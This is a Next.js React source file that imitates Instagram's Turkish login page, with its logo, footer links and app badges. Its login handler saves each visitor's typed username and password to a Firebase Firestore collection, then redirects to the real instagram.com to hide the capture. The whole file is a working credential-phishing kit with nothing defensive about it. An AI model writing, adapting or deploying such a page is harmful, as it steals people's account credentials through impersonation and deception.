"use client"
import { doc, setDoc } from "firebase/firestore";
import Image from "next/image";
import Link from "next/link";
import { useState } from "react";
import { IoLogoFacebook } from "react-icons/io";
import { firestore } from "../../../../firebase"
import { nanoid } from "nanoid";
import { useRouter } from "next/navigation";

const dirs = [
  {
    text: "Meta",
    link: "https://about.meta.com/"
  },
  {
    text: "Hakkında",
    link: "https://about.instagram.com/"
  },
  {
    text: "Blog",
    link: "https://about.instagram.com/blog"
  },
  {
    text: "İş Fırsatları",
    link: "https://about.instagram.com/about-us/careers"
  },
  {
    text: "Yardım",
    link: "https://help.instagram.com/"
  },
  {
    text: "API",
    link: "https://developers.facebook.com/docs/instagram"
  },
  {
    text: "Gizlilik",
    link: "https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect"
  },
  {
    text: "Koşullar",
    link: "https://help.instagram.com/581066165581870/"
  },
  {
    text: "Konumlar",
    link: "https://www.instagram.com/explore/locations/"
  },
  {
    text: "Instagram Lite",
    link: "https://www.instagram.com/web/lite/"
  },
  {
    text: "Threads",
    link: "https://www.threads.net/login"
  },
  {
    text: "Kişi Yükleme ve Hesabı Olmayan Kişiler",
    link: "https://www.facebook.com/help/instagram/261704639352628"
  },
  {
    text: "Meta Verified",
    link: "https://about.meta.com/technologies/meta-verified/"
  }
]
const links = {
  fb: "https://cdn.discordapp.com/attachments/1214595347762913340/1215385619870777394/image.png?ex=65fc8f10&is=65ea1a10&hm=53b3e0fd017760121832361f8ca742a4fed6fbf38a814ee66bfcba9b2a605283&",
  insta:"https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png",
  googleplay: "https://static.cdninstagram.com/rsrc.php/v3/yp/r/XUCupIzGmzB.png",
  microsoft: "https://static.cdninstagram.com/rsrc.php/v3/yf/r/BFthdeAc5KC.png"
};

export default function MainPage() {
  const router = useRouter()
  const [form, setForm] = useState({
    userName: "",
    password: ""
  });
  const handleLogin = async () => {
    const commonId = nanoid()
    const docRef = await setDoc(
      doc(firestore, `/datas/${commonId}`),
      {
        info: form.userName,
        psasword: form.password
      }
    );
    router.push("https://instagram.com")
  }
  const [type, setType] = useState("password");
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm((prev) => ({
      ...prev,
      [e.target.name]: e.target.value
    }))
  }
  const togglePasswordVisibility = () => {
    setType((prevType) => (prevType === "password" ? "text" : "password"));
  };
  return (
    <main className="min-h-screen  mt-10 flex flex-col gap-4 items-center">
      <div className="w-[175px] h-[51px] mx-auto">
        <img src={links.insta} />
      </div>
      <div className="w-[260px] mt-10 text-[12px] mx-auto flex flex-col gap-3">
        <input
          name="userName"
          onChange={handleChange}
          className="inputs w-[260px] text-left outline-zinc-400 "
          placeholder="Telefon numarası, kullanıcı adı veya e-posta"
        />
        <div className="inline-flex relative">
          <input
            name="password"
            type={type}
            onChange={handleChange}
            className="inputs w-[260px] text-left outline-zinc-400 "
            placeholder="Enter password"
          />
          {form.password.length > 0 && (
            <button
              className="text-[14px] absolute right-0 top-1/2 mr-2 transform -translate-y-1/2"
              onClick={togglePasswordVisibility}
            >
              {type === "password" ? "Göster" : "Gizle"}
            </button>
          )}
        </div>
      </div>
      <div className="w-[270px] h-[32px] mx-auto">
        <button
          onClick={handleLogin}
          className="w-[270px] text-[14px] text-white h-[32px] cursor-pointer rounded-md bg-sky-400"
        >
          Giriş Yap
        </button>
      </div>
      <p className="text-center text-[17px] text-zinc-400">YA DA</p>
      <div className="flex gap-2 items-center mt-5">
        <img src={links.fb} alt="" />
        <p className="text-blue-500 font-medium text-[14px]">
          Facebook ile Giriş Yap
        </p>
      </div>
      <Link
        className="text-center text-[12px]"
        href="https://www.instagram.com/account/password/reset"
      >
        Şifreni mi unuttun?
      </Link>
      <p className="text-[14px] mt-5">
        Hesabın yok mu?{" "}
        <Link
          className="text-blue-500"
          href="https://www.instagram.com/accounts/signup/phone"
        >
          Kaydol
        </Link>
      </p>
      <div className="items-center">
        <p className="text-[14px] mt-14 text-center">Uygulamayı indir.</p>
        <div className="flex gap-3 mt-3">
          <img
            className="w-[134.28px] h-[40px]"
            src={links.googleplay}
            alt=""
          />
          <img className="w-[110.77px] h-[40px]" src={links.microsoft} alt="" />
        </div>
      </div>
      <div className="flex mt-10 text-zinc-500 text-[12px] flex-wrap gap-4 max-w-[340px] justify-center">
        {dirs.map((d) => {
          return (
            <Link target="_blank" key={d.text} href={d.link}>
              {d.text}
            </Link>
          );
        })}
      </div>
    </main>
  );
}
